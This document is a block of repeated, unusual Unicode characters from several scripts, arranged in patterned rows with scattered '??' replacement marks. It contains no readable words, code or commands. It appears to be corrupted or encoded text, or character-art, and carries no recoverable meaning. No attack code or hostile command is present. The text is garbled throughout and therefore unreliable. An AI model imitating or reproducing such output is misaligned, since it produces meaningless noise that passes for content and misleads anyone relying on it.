࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛𞋬𞋬𞋬𞋬𞋬??࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬??࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬??︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁𞋬??࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡙࡙࡙࡙࡙࡙ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬